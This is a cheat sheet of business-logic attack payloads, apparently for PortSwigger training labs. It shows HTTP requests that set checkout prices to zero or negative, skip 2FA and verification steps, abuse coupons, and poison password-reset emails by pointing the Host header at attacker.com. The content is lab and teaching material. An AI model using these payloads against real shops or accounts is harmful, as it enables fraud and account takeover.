# Business Logic Flaws - Payload Reference

## Client-Side Trust

### Price Manipulation
```
# Change price in POST body during checkout
original: price=1337
modified: price=0
modified: price=1
modified: price=-100
```

### Quantity Manipulation
```
# Negative quantity to get money back
original: quantity=1
modified: quantity=-1
modified: quantity=0
```

### Discount/Coupon Abuse
```
# Apply coupon multiple times
# Use expired coupons
# Stack multiple coupons
```

## Authentication Logic Flaws

### Password Reset Poisoning
```
# Change Host header to attacker domain
POST /forgot-password
Host: attacker.com
username=victim
# Reset email sent to attacker.com
```

### 2FA Bypass
```
# Skip 2FA step by directly accessing protected page
GET /my-account (without completing 2FA)
```

### Race Condition in Password Reset
```
# Request multiple password resets simultaneously
# Each generates a different token
# Use the last valid token
```

## Access Control Logic Flaws

### Step Bypass
```
# Skip multi-step process
Step 1: /order/confirm → Step 2: /order/pay → Step 3: /order/complete
Bypass: Jump directly from Step 1 to Step 3
```

### Parameter Pollution
```
# Send same parameter twice
username=admin&username=user
# Server may use one, you control which
```

## PortSwigger Lab Approach
1. Understand the business flow (add to cart → checkout → pay)
2. Identify client-side controls (hidden fields, JS validation)
3. Manipulate values in transit (price, quantity, role)
4. Test edge cases (negative, zero, overflow, empty)
5. Skip steps or repeat steps

## PortSwigger Verified Solutions

### Lab: Excessive trust in client-side controls
**Status**: COMMON TYPE
```
# Intercept checkout request, modify price
POST /cart/checkout
productId=1&quantity=1&price=0
```

### Lab: High-level logic vulnerability
**Status**: COMMON TYPE
```
# Negative quantity offsets positive quantity
POST /cart/update
productId=1&quantity=-99
# Then add expensive item
productId=2&quantity=1
# Total: negative + positive = low price
```

### Lab: Inconsistent security controls
**Status**: COMMON TYPE
```
# Change email to admin domain
POST /my-account/change-email
email=wiener@dontwannacry.com
# Role elevation happens automatically
```

### Lab: Flawed enforcement of business rules
**Status**: COMMON TYPE
```
# Apply coupon1, then coupon2
# Remove coupon1
# Apply coupon1 again
# Both still active, but system only tracks one
```

### Lab: Authentication bypass via flawed state machine
**Status**: COMMON TYPE
```
# Skip email verification
# Start login → skip /verify-email → go directly to /my-account
```

## Mass Assignment

### Lab: 2FA simple bypass
```
# After login, access /my-account directly
# Skip the 2FA verification page entirely
GET /my-account
```

## Key Patterns

1. **Client-side validation only** → Modify request directly
2. **No server-side state tracking** → Repeat/skip steps
3. **Implicit trust in user input** → Change roles/prices
4. **Missing negative checks** → Use negative quantities
5. **Race conditions** → Concurrent requests
